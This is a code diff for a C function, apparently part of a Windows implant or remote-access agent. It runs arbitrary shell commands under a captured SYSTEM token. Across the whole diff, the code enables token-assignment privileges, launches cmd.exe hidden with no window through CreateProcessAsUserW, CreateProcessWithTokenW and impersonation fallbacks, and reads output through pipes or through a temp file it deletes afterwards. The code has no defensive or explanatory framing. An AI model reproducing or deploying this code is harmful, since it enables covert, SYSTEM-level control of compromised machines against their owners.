@@ -97,35 +97,10 @@ static char* run_shell(const char *cmd) {
     HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
         (PVOID*)&g_system_token, NULL, NULL);
     if (hSysTok) {
-        /* Redirect output to a temp file via command-line '>' rather than
-           passing pipe handles through STARTF_USESTDHANDLES.
-           CreateProcessWithTokenW goes through seclogon, which cannot always
-           duplicate pipe handles across session boundaries — this causes
-           STATUS_DLL_INIT_FAILED (0xC0000142) in the child process.
-           A file written by the child (same session context) is readable by
-           our process afterwards without any handle-inheritance issues. */
-        char out_path[MAX_PATH];
-        snprintf(out_path, sizeof(out_path),
-                 "C:\\Windows\\Temp\\sbo%08lx%08lx.tmp",
-                 (unsigned long)GetCurrentProcessId(),
-                 (unsigned long)GetTickCount());
-
-        /* Build: cmd.exe /d /c <cmd> > "<out_path>" 2>&1 */
-        char redir_args[4096 + MAX_PATH + 32];
-        int redir_len = snprintf(redir_args, sizeof(redir_args),
-                                 "/d /c %s > \"%s\" 2>&1", cmd, out_path);
-        if (redir_len < 0 || (size_t)redir_len >= sizeof(redir_args))
-            return strdup("[error: shell command too long]");
-
-        wchar_t wargs[4096 + MAX_PATH + 32];
-        wchar_t wargs2[4096 + MAX_PATH + 32];
-        MultiByteToWideChar(CP_ACP, 0, redir_args, -1, wargs,
-                            (int)(sizeof(wargs)/sizeof(wargs[0])));
-        memcpy(wargs2, wargs, sizeof(wargs2));
-
         static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
         static const wchar_t cmd_cwd[] = L"C:\\Windows\\System32";
 
+        /* Enable required privileges on the calling process and the SYSTEM token. */
         HANDLE hSelf = NULL;
         if (OpenProcessToken(GetCurrentProcess(),
                              TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) {
@@ -138,50 +113,146 @@ static char* run_shell(const char *cmd) {
         enable_privilege(hSysTok, "SeIncreaseQuotaPrivilege");
         enable_privilege(hSysTok, "SeAssignPrimaryTokenPrivilege");
 
-        /* No STARTF_USESTDHANDLES — the child writes its own output file. */
-        STARTUPINFOW si = {0};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {0};
+        /* ── T1: CreateProcessAsUserW + anonymous pipes ─────────────────────
+           Does NOT go through seclogon — direct creation in the caller's session,
+           so pipe handles inherit correctly without STATUS_DLL_INIT_FAILED. */
+        char *pipe_result = NULL;
+        {
+            SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
+            HANDLE hRead = NULL, hWrite = NULL;
+            BOOL pipe_ok = CreatePipe(&hRead, &hWrite, &sa, 0);
+            if (pipe_ok) pipe_ok = SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+            if (!pipe_ok) {
+                if (hRead)  CloseHandle(hRead);
+                if (hWrite) CloseHandle(hWrite);
+                hRead = hWrite = NULL;
+            }
+            if (pipe_ok) {
+                char pipe_args[4096];
+                snprintf(pipe_args, sizeof(pipe_args), "/d /c %s 2>&1", cmd);
+                wchar_t wargs_pipe[4096];
+                MultiByteToWideChar(CP_ACP, 0, pipe_args, -1, wargs_pipe,
+                                    (int)(sizeof(wargs_pipe)/sizeof(wargs_pipe[0])));
+                STARTUPINFOW si = {0};
+                si.cb = sizeof(si);
+                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                si.hStdInput = NULL; si.hStdOutput = hWrite; si.hStdError = hWrite;
+                PROCESS_INFORMATION pi = {0};
+                BOOL proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs_pipe,
+                    NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+                CloseHandle(hWrite);
+                if (proc_ok) {
+                    size_t cap = 4096, len = 0;
+                    char *buf = (char*)malloc(cap + 1);
+                    if (buf) {
+                        DWORD tick_start = GetTickCount();
+                        while (1) {
+                            DWORD avail = 0;
+                            if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+                                if (len + avail >= cap) {
+                                    size_t nc = (cap + avail) * 2;
+                                    char *nb = (char*)realloc(buf, nc + 1);
+                                    if (nb) { buf = nb; cap = nc; }
+                                }
+                                DWORD nr = 0;
+                                DWORD to_read = (DWORD)(cap - len) < avail ?
+                                                (DWORD)(cap - len) : avail;
+                                ReadFile(hRead, buf + len, to_read, &nr, NULL);
+                                len += nr;
+                                continue;
+                            }
+                            DWORD exit_code = STILL_ACTIVE;
+                            GetExitCodeProcess(pi.hProcess, &exit_code);
+                            if (exit_code != STILL_ACTIVE) {
+                                avail = 0;
+                                while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+                                    if (len + avail >= cap) {
+                                        size_t nc = (cap + avail) * 2;
+                                        char *nb = (char*)realloc(buf, nc + 1);
+                                        if (nb) { buf = nb; cap = nc; }
+                                    }
+                                    DWORD nr = 0;
+                                    DWORD to_read = (DWORD)(cap - len) < avail ?
+                                                    (DWORD)(cap - len) : avail;
+                                    ReadFile(hRead, buf + len, to_read, &nr, NULL);
+                                    len += nr;
+                                    avail = 0;
+                                }
+                                break;
+                            }
+                            if (GetTickCount() - tick_start > 60000) {
+                                TerminateProcess(pi.hProcess, 1); break;
+                            }
+                            Sleep(10);
+                        }
+                        buf[len] = '\0';
+                        pipe_result = buf;
+                    }
+                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+                }
+                CloseHandle(hRead);
+            }
+        }
+        if (pipe_result) return pipe_result;
 
-        BOOL proc_ok = FALSE;
+        /* ── T2 fallback: CreateProcessWithTokenW + temp file ───────────────
+           Only reached if CreateProcessAsUserW failed (SeAssignPrimaryToken
+           not available). Child writes its own output file — no pipe
+           handle inheritance across session boundaries needed. */
+        char out_path[MAX_PATH];
+        snprintf(out_path, sizeof(out_path),
+                 "C:\\Windows\\Temp\\sbo%08lx%08lx.tmp",
+                 (unsigned long)GetCurrentProcessId(),
+                 (unsigned long)GetTickCount());
+        char redir_args[4096 + MAX_PATH + 32];
+        int redir_len = snprintf(redir_args, sizeof(redir_args),
+                                 "/d /c %s > \"%s\" 2>&1", cmd, out_path);
+        if (redir_len < 0 || (size_t)redir_len >= sizeof(redir_args))
+            return strdup("[error: shell command too long]");
+        wchar_t wargs[4096 + MAX_PATH + 32];
+        wchar_t wargs2[4096 + MAX_PATH + 32];
+        MultiByteToWideChar(CP_ACP, 0, redir_args, -1, wargs,
+                            (int)(sizeof(wargs)/sizeof(wargs[0])));
+        memcpy(wargs2, wargs, sizeof(wargs2));
+        STARTUPINFOW si2 = {0};
+        si2.cb = sizeof(si2);
+        si2.dwFlags = STARTF_USESHOWWINDOW;
+        si2.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi2 = {0};
+        BOOL proc_ok2 = FALSE;
         DWORD with_token_err = 0, as_user_err = 0, imp_err = 0;
-
         if (CreateProcessWithTokenW) {
-            proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs,
-                CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
-            if (!proc_ok) with_token_err = GetLastError();
+            proc_ok2 = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs,
+                CREATE_NO_WINDOW, NULL, cmd_cwd, &si2, &pi2);
+            if (!proc_ok2) with_token_err = GetLastError();
         }
-        if (!proc_ok && CreateProcessAsUserW) {
-            proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs2,
-                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
-            if (!proc_ok) as_user_err = GetLastError();
+        if (!proc_ok2 && CreateProcessAsUserW) {
+            proc_ok2 = CreateProcessAsUserW(hSysTok, cmd_app, wargs2,
+                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si2, &pi2);
+            if (!proc_ok2) as_user_err = GetLastError();
         }
-        if (!proc_ok && CreateProcessWithTokenW) {
+        if (!proc_ok2 && CreateProcessWithTokenW) {
             if (ImpersonateLoggedOnUser(hSysTok)) {
                 wchar_t wargs3[4096 + MAX_PATH + 32];
                 memcpy(wargs3, wargs, sizeof(wargs3));
-                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs3,
-                    CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
-                if (!proc_ok) with_token_err = GetLastError();
+                proc_ok2 = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs3,
+                    CREATE_NO_WINDOW, NULL, cmd_cwd, &si2, &pi2);
+                if (!proc_ok2) with_token_err = GetLastError();
                 RevertToSelf();
             } else {
                 imp_err = GetLastError();
             }
         }
-        if (!proc_ok) {
+        if (!proc_ok2) {
             char *e = (char*)malloc(192);
             snprintf(e, 192,
                      "[error: SYSTEM shell launch; WithToken=%lu; AsUser=%lu; Impersonate=%lu]",
                      with_token_err, as_user_err, imp_err);
             return e;
         }
-
-        WaitForSingleObject(pi.hProcess, 60000);
-        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-
-        /* Read the output file written by the child. */
+        WaitForSingleObject(pi2.hProcess, 60000);
+        CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
         HANDLE hFile = CreateFileA(out_path, GENERIC_READ,
             FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -190,15 +261,15 @@ static char* run_shell(const char *cmd) {
             return strdup("");
         }
         DWORD fsize = GetFileSize(hFile, NULL);
-        char *buf = fsize > 0 ? (char*)malloc((size_t)fsize + 1) : NULL;
-        DWORD nr = 0;
-        if (buf && fsize > 0) {
-            ReadFile(hFile, buf, fsize, &nr, NULL);
-            buf[nr] = '\0';
+        char *buf2 = fsize > 0 ? (char*)malloc((size_t)fsize + 1) : NULL;
+        DWORD nr2 = 0;
+        if (buf2 && fsize > 0) {
+            ReadFile(hFile, buf2, fsize, &nr2, NULL);
+            buf2[nr2] = '\0';
         }
         CloseHandle(hFile);
         DeleteFileA(out_path);
-        return buf ? buf : strdup("");
+        return buf2 ? buf2 : strdup("");
     }
 
     FILE *f = _popen(full_cmd, "r");
